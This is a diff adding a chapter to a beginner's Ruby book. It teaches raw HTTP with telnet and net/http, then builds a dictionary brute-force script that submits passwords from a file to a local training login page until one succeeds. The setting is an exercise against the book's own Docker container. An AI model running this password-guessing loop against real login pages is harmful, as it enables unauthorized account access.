@@ -84,7 +84,7 @@ This probably doesn't matter for files like we have (with the size of about 10KB
 
 Look at the "`each_line`" method from [IO class](http://ruby-doc.org/core-2.5.1/IO.html#method-i-each_line ) (which stands for input-output). Fore we move further, try to do the following exercise.
 
-X> ## Exercise
+X> ## Exercise 1
 X> Without looking to solution below use the provided documentation link and implement the program that reads lines from a file one by one and prints the length of every single line.
 
 Below is the code of such program, it reads "`passwords.txt`" and prints the line size:
@@ -193,4 +193,147 @@ Unfortunately, Chrome Developer Tools doesn't show you original query as a plain
 ![Charles Proxy shows the raw HTTP request](images/087-charles-proxy.png)
 
 If we connect from a simple tool like telnet and send the _text_ you see on the right, you'll give exactly the same answer. This is basically how browsers work, most of the time they operate with text request and responses.
+
+X> ## Exercise 2
+X> Modern tools (like Chrome Developer Tools) represent the server response in UI-friendly format, hiding details while response is just a text. Login to your favorite website while running, for example, Charles Proxy and look at the raw text data for both request and response. If you struggle finding website to login, use [http://localhost:4567/login](http://localhost:4567/login). Compare this data with what Chrome Developer Tools shows as a response in "Network" tab.
+
+X> ## Exercise 3
+X> Try to connect to the Docker container with "`telnet`" (you might need to install it first, look up the docs online). Try to send GET-request manually by running "`telnet localhost 4567`" and typing "`GET / HTTP/1.0`" followed two new lines (hit Enter to send a new line). Can you see the html response from the container?
+
+X> ## Exercise 4
+X> Try to connect to the Docker container with "`telnet`" and send the following POST-request manually (for example, by typing all of that in your terminal - do not copy and paste) and hit Enter:
+
+```
+POST /login HTTP/1.0
+Content-length: 30
+
+username=admin&password=123456
+```
+
+Now you know a little bit about GET and POST requests. GET request is more like a query that is used to get the data. While POST is HTTP command that submits the data and can modify the backend state.
+
+It would be nice if we could do what we did manually with some Ruby methods. We're lucky to have standard "`net/http`" [library](https://ruby-doc.org/stdlib-2.5.1/libdoc/net/http/rdoc/Net/HTTP.html). Let's create minimalistic program that just sends POST request with "admin" username and "123456" password.
+
+X> ## Exercise 4
+X> Looking at the HTTP library documentation link above, try to implement this program by your own. The program should connect to "`http://localhost:4567/login`", submit "`username`"  and "`password`" parameters. The program should print response. The response should contain "Wrong username or password, please try again" text (some extra html is okay).
+
+Here is the listing of such program (no, really - try do it yourself before looking at the listing below):
+
+{lang=ruby, line-numbers=off}
+```ruby
+require 'net/http'
+
+uri = URI('http://localhost:4567/login')
+res = Net::HTTP.post_form(uri, username: 'admin', password: '123456')
+puts res.body
+```
+
+For the most part, code above is copied from the docs. First line says that we require "net/http" library. Third line creates URI object (represents Universal Resource Identifier). URI here contains four parts:
+
+* http protocol
+* host name (localhost)
+* port number, 4567
+* path, "`/login`"
+
+Line 4 is just a static (class) "`post_form`" method call on HTTP class from module Net where we pass newly created URI object and hash with parameters. Hash can be specified explicitly, however it's not recommended in newer versions of Ruby:
+
+```ruby
+res = Net::HTTP.post_form(uri, { username: 'admin', password: '123456' })
+```
+
+Rubocop (static code analysis tool) would complain about that line though, throwing "Redundant Curly Braces" warning.
+
+Last line in the listing above prints the response body:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>App</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="tacit-css.min.css"/>
+  </head>
+
+  <body >
+    <div>
+      <p>Wrong username or password, please try again</p>
+
+    </div>
+  </body>
+</html>
+```
+
+What if we combine two programs together: iteration over each password from the passwords file, and program that creates http requests:
+
+```ruby
+require 'net/http'
+
+uri = URI('http://localhost:4567/login')
+
+File.new('passwords.txt').each do |line|
+  password = line.chomp
+  puts "Trying #{password}..."
+  res = Net::HTTP.post_form(uri, username: 'admin', password: password)
+  puts res.body
+end
+```
+
+The program works fine, for every password in the passwords file it submits request and prints result on the screen. Since password is in the list, we have guarantee that sooner or later the program is going to print different result, without saying "_Wrong username or password, please try again_", it is going to be something else. All we need to do now is to keep on watching. However, there is a room for improvement:
+
+* Watching output is quite fast for a human. It tries 10 password every second. It's possible, but not easy for a human to spot the different output.
+* From the program's standpoint there is no difference between right or wrong guess: it will continue iterating over passwords in the file no matter what.
+
+All of that is quite easy to fix: if response body contains word "Wrong", then we need to continue. Otherwise we should stop the flow and exit. Let's put all of these changes and look at result:
+
+```ruby
+require 'net/http'
+
+uri = URI('http://localhost:4567/login')
+
+File.new('passwords.txt').each do |line|
+  password = line.chomp
+  puts "Trying #{password}..."
+  res = Net::HTTP.post_form(uri, username: 'admin', password: password)
+  if res.body.include?('Wrong')
+    # don't do anything, just continue
+  else
+    puts "Password found: #{password}"
+    exit
+  end
+end
+```
+
+Result:
+
+```
+Trying password...
+Trying 123456...
+Trying 12345678...
+Trying 1234...
+Trying qwerty...
+Trying 12345...
+...
+Password found: (actual password removed from the book so you have more fun!)
+```
+
+Yay! We found the password and saved the world! Try to type "admin" and the actual password in UI and you'll get the following result:
+
+{width=100%}
+![You saved the planet!](images/087-welcome-admin.png)
+
+X> ## Exercise 5
+X> Run the program and save the world. Think about how you can improve if-else statement so it looks little bit more readable.
+
+X> ## Exercise 6
+X> Using the actual password, replace "123456" below, connect to the server with telnet and type the following request:
+
+```
+POST /login HTTP/1.0
+Content-length: 30
+
+username=admin&password=123456
+```
+
+Hit Enter and make sure server response contains "Congratulations".
 
